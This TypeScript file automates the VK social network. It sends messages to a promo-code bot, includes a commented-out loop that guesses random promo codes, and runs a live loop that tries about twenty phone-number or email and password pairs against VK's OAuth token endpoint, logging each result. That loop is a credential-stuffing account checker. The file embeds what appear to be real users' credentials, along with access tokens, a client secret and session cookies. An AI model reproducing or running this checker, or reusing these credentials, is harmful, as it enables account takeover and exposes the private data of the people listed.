import {URLSearchParams} from "url";
import * as path from "path";

const mv = require('mv');
const fs = require('fs');
(<any>global).fetch = require("node-fetch");
(<any>global).URLSearchParams = URLSearchParams;

// https://oauth.vk.com/authorize?client_id=6825777&scope=notify,photos,friends,audio,video,notes,pages,docs,status,questions,offers,wall,groups,messages,notifications,stats,ads,offline&redirect_uri=http://api.vk.com/blank.html&display=page&response_type=token
let a = 'QNYNESXHAFCTPKJPD';

export class Mcdonalds {
  private userId: string = "427408928"; //test
  private botId: string = "-30108525"; //
  // private botId: string = "-9580285"; //
  private token: string = '7ca8a365f8065e9e245b605d2bac85a974c5be84b70e70064bbf77b7aa21ac28212408cb46eacae69ec6a';

  public async start(code: string, accessToken?: string) {
    const res = await this.sendMessage('Промокод', this.token);
    // const res = await this.sendMessage('Да, он просто бомба!', this.token);
    console.log(code, JSON.stringify(await res.json()));
    // await this.sendMessage('#ВсеЕщеБигМак', accessToken);
    const sleep1 = randomBetween(500, 1500);
    await sleep(sleep1);
    // await this.sendMessage('Да', accessToken);
    await this.sendMessage(code, this.token);
    // const sleep3 = randomBetween(20000, 25000);
    const sleep3 = randomBetween(2000, 5000);
    await sleep(sleep3);

    // const historyFirst = await this.getHistory(accessToken);
    // const messageFirst = (await historyFirst.json()).response.items[0];
    // if (messageFirst.body.indexOf("правильном порядке") > 0) {
    //   console.log("опрос с кнопками, пройти вручную: ", accessToken);
      //await this.sendMessage('Две мясных котлеты гриль', accessToken);
      // await sleep(5000);
      // await this.sendMessage('Специальный соус-сыр', accessToken);
      // await sleep(5000);
      // await this.sendMessage('Огурцы, салат и лук', accessToken);
      // await sleep(5000);
      // await this.sendMessage('Все на булочке с кунжутом', accessToken);
      // await sleep(5000);
      // await this.sendMessage('Только так! И это Биг Мак!', accessToken);
      // await sleep(5000);
    // } else {
      // await this.sendMessage('По кочану', accessToken);
    // }

    // const history = await this.getHistory(accessToken);
    // const json = await history.json();
    // const message = json.response.items[2];
    //
    // if (message.attachments) {
    //   const photo = message.attachments[0];
    //   await this.download("https://www.decodeit.ru/image.php?type=qr&value=095A45290917181F0442163F71757863647546564652580C0B09030454524D420F090E040B0501450C5F5F000F524957510E5A525F781E1E595755");
    //
    //   console.log(accessToken, photo.photo.photo_604);
    // }
  }

  private async download(url: string) {
    const fileName = url.split('/')[url.split('/').length - 1];
    const res = await fetch(url);
    await new Promise((resolve, reject) => {
      const fileStream = fs.createWriteStream(`${path.join(process.cwd(), 'mc', fileName)}`);
      (<any>res.body).pipe(fileStream);
      (<any>res.body).on("error", (err) => {
        reject(err);
      });
      fileStream.on("finish", function() {
        resolve();
      });
    });
  }

  private async sendMessage(message: string, token: string) {
    let button= JSON.stringify({"button": "27"});
    const url = `https://api.vk.com/method/messages.send?user_id=${this.botId}&message=${encodeURIComponent(message)}&v=5.37&access_token=${token}&payload=${button}`;
    return await fetch(url);
  }

  private async getHistory(token: string) {
    const url = `https://api.vk.com/method/messages.getHistory?user_id=${this.botId}&v=5.37&access_token=${token}`;
    return await fetch(url);
  }
}

export function sleep(time) {
  return new Promise(resolve => setTimeout(resolve, time));
}


const token = 'd6bca6f609b6facb3f59ee4e678cfadf68c7df632345964e42b5c76e4556a89c7a5ea52aaca337aca6b5a';


let values = [
  // {username: "77078412389", password: "YPHTCINT2"},
  // {username: "77022587032", password: "QSV659znT2"},
  // {username: "79182979671", password: "RCLvQUxO56"},
  // {username: "79384947452", password: "azarw12kaj"},
  // {username: "79159476743", password: "Qret1234-bz"},
  // {username: "77088461848", password: "QSV659znT234"},
  // {username: "77078411391", password: "RCLvQUxO56y12"},
  // {username: "77087557318", password: "zhnvhjyhxoa044"},
  // {username: "77767821430", password: "DTF35YGEZ48J2"},
  // {username: "77767759786", password: "azarw12kajbb"},
  // {username: "77087557214", password: "HONORLD2EI4E5"},
  // {username: "77088461817", password: "NY19KS3Y50GJB"},
  // {username: "77767760360", password: "fc86955c865e555"},
  // {username: "77767758889", password: "azarw12kajbb23"},
  // {username: "77470647715", password: "azarw12jbb23"},
  // {username: "77470647785", password: "arw12kajbb233"},
  // {username: "77470647754", password: "jguorw12kajbb23"},
  // {username: "77479564847", password: "  azarw12jbb23"},
  // {username: "77767758118", password: "RCLvQUxO56y12"},
  // {username: "77479564840", password: "QSV659znT234"},
  // {username: "77767759020", password: "zhnvhjyhxoa0"},
  // {username: "77470828115", password: "RCLvQUxO56y12"},
  // {username: "77070146620", password: "zhnvhjyhxoa044"},
  // {username: "77716490052", password: "azarw12kaj"},
  // {username: "77470365104", password: "RCLvQUxO56y12"},
  // {username: "77470828171", password: "arw12kajbb233"},
  // {username: "77470646131", password: "azarw12kaj"},
  // {username: "77470646159", password: "QSV659znT2"},
  // {username: "77785648212", password: "azarw12jbb23g"},
  // {username: "77470828152", password: "fedf3qdfhj"},
  // {username: "77479245744", password: "jguorw12kajbb23"},
  // {username: "77479245744", password: "ST20NGUS3ZV8"},
  // {username: "77479243601", password: "jguorw12kajbb23"},
  // {username: "77070144641", password: "e11d6ee0167a"},
  // {username: "77715986628", password: "65ecf6017da4"},
  // {username: "77715986529", password: "6f1e3447013d"},
  // {username: "77079206843", password: "azarw12jbb23"},
  // {username: "77088477860", password: "azarw12jbb23v"},
  // {username: "77478406753", password: "65ecf6017da4"},
  // {username: "77088615186", password: "gehhh47hdh12"},
  // {username: "77787252270", password: "hsghgg266ghsh"},
  // {username: "77716491525", password: "gshh56gsyjx"},
  // {username: "77470371334", password: "43722d6193f4"},
  // {username: "77052161130", password: "95614cb24987"},
];

let arr = [
  {username: "77072591025", password:  "940CF60CB117"},
  {username: "77072662124", password:  "F01AD52BF202"},
  {username: "77072679479", password:  "bmwtalas"},
  {username: "77073052933", password:  "d5372d3b2607"},
  {username: "77073880309", password:  "8c370890a100"},
  {username: "77074551363", password:  "ff3173331e3e"},
  {username: "77711827190", password: "zarina10"},

  {username: "77711828081", password: "erboldariga033198"},

  {username: "77711835021", password: "moneykas"},
  {username: "77711841891", password: "sonytoha"},
  {username: "77711849696", password: "karina1999"},
  {username: "79065460192", password: "максим2007"},
  {username: "79520614722", password: "123321veve20t03"},
  {username: "79922097032", password: "leomessi1024062002"},
  {username: "f.s.evseev@mail.ru", password: "evseev2004"},
  {username: "kalininleha2003@mail.ru", password: "kotkota2"},
  {username: "ak-anonim@yandex.ru", password: "89097522152Sasha"},
  {username: "danil811244@mail.ru", password: "danil811244"},
  {username: "mainpro2004@mail.ru", password: "qwerttrewq"},

];

(async () => {
  // for (let i = 0; i < 20; ++i) {
  //   let code = "SC3";
  //   for (let i = 0; i < 5; ++i) {
  //     code += a[randomBetween(0, a.length - 1)];
  //   }
  //
  //   await new Mcdonalds().start(code.toUpperCase(), token);
  // }

  values = arr;
  for (let i = 0; i < values.length; ++i) {
    // let res = await fetch(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${values[i].username}&password=${values[i].password}`, { headers, "referrerPolicy":"no-referrer-when-downgrade","body":null,"method":"GET","mode":"cors" })
    // let res = await fetch(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${values[i].username}&password=${values[i].password}`, { headers, "referrerPolicy":"no-referrer-when-downgrade","body":null,"method":"GET","mode":"cors" })
    let res = await fetch(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${values[i].username}&password=${values[i].password}`, {"credentials":"include","headers":{"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-language":"uk,ru;q=0.9,en;q=0.8","cache-control":"no-cache","pragma":"no-cache","upgrade-insecure-requests":"1"},"referrerPolicy":"no-referrer-when-downgrade","body":null,"method":"GET","mode":"cors"});
    console.log(values[i].username, values[i].password, JSON.stringify(await res.json()));
    await sleep(1000);
  }
})();

function randomBetween(start, end) {
  return Math.floor(Math.random() * end) + start;
}


let headers = {
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'uk,ru;q=0.9,en;q=0.8',
'cache-control': 'no-cache',
'cookie': 'remixlang=0; remixscreen_depth=24; remixdt=0; remixstid=1292935112_75ae4d2c517298fa3b; remixflash=31.0.0; remixtst=ef335bd9; remixusid=OTM4NDliMWQyN2Y2ZTIxODJiZWYzMzk1; remixscreen_orient=1; remixgp=ac692706e0904a8f6f23915561acba1b; remixseenads=2; remixrt=1; remixrefkey=86cd6ec88467a17b2f; remixsid=8490aefa4bd648327dd2657964298072605dd0cbd85460edb07e3; remixsts=%7B%22data%22%3A%5B%5B1554661124%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A1682%2C%22last%22%3A1554661122623%2C%22options%22%3A%7B%7D%7D%2C%22im%22%3A%7B%22full%22%3A1%2C%22last%22%3A1554661122624%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661130%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A7683%2C%22last%22%3A1554661128624%2C%22options%22%3A%7B%7D%7D%2C%22im%22%3A%7B%22full%22%3A3000%2C%22last%22%3A1554661128624%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661131%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A9005%2C%22last%22%3A1554661129946%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661133%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A0%2C%22last%22%3A1554661131625%2C%22options%22%3A%7B%7D%7D%2C%22groups%22%3A%7B%22full%22%3A0%2C%22last%22%3A1554661131625%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661136%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A1675%2C%22last%22%3A1554661134625%2C%22options%22%3A%7B%7D%7D%2C%22im%22%3A%7B%22full%22%3A1%2C%22last%22%3A1554661134626%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661142%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A8674%2C%22last%22%3A1554661141624%2C%22options%22%3A%7B%7D%7D%2C%22im%22%3A%7B%22full%22%3A3002%2C%22last%22%3A1554661141624%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661143%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A9001%2C%22last%22%3A1554661141951%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661146%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A999%2C%22last%22%3A1554661145623%2C%22options%22%3A%7B%7D%7D%2C%22groups%22%3A%7B%22full%22%3A332%2C%22last%22%3A1554661144956%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661149%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A3000%2C%22last%22%3A1554661147624%2C%22options%22%3A%7B%7D%7D%2C%22groups%22%3A%7B%22full%22%3A333%2C%22last%22%3A1554661147957%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661155%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A5999%2C%22last%22%3A1554661154623%2C%22options%22%3A%7B%7D%7D%2C%22groups%22%3A%7B%22full%22%3A3998%2C%22last%22%3A1554661154623%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661155%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A6004%2C%22last%22%3A1554661154628%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661158%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A663%2C%22last%22%3A1554661157624%2C%22options%22%3A%7B%7D%7D%2C%22im%22%3A%7B%22full%22%3A0%2C%22last%22%3A1554661157624%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661159%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A9999%2C%22last%22%3A1554661158623%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661167%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A9006%2C%22last%22%3A1554661165967%2C%22options%22%3A%7B%7D%7D%2C%22im%22%3A%7B%22full%22%3A3999%2C%22last%22%3A1554661164624%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661168%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A0%2C%22last%22%3A1554661167623%2C%22options%22%3A%7B%7D%7D%2C%22groups%22%3A%7B%22full%22%3A0%2C%22last%22%3A1554661167623%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661171%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A2997%2C%22last%22%3A1554661170623%2C%22options%22%3A%7B%7D%7D%2C%22groups%22%3A%7B%22full%22%3A1655%2C%22last%22%3A1554661170624%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661172%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A3997%2C%22last%22%3A1554661171623%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661180%2C%22time_spent%22%2C%7B%22groups%22%3A%7B%22full%22%3A6651%2C%22last%22%3A1554661178623%2C%22options%22%3A%7B%7D%7D%2C%22im%22%3A%7B%22full%22%3A4001%2C%22last%22%3A1554661177625%2C%22options%22%3A%7B%7D%7D%7D%5D%2C%5B1554661181%2C%22time_spent%22%2C%7B%22im%22%3A%7B%22full%22%3A0%2C%22last%22%3A1554661180623%2C%22options%22%3A%7B%7D%7D%2C%22groups%22%3A%7B%22full%22%3A0%2C%22last%22%3A1554661180623%2C%22options%22%3A%7B%7D%7D%7D%5D%5D%2C%22uniqueId%22%3A177113200%7D',
'pragma': 'no-cache',
'upgrade-insecure-requests': '1',
'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 YaBrowser/19.3.0.2489 Yowser/2.5 Safari/537.36',
};




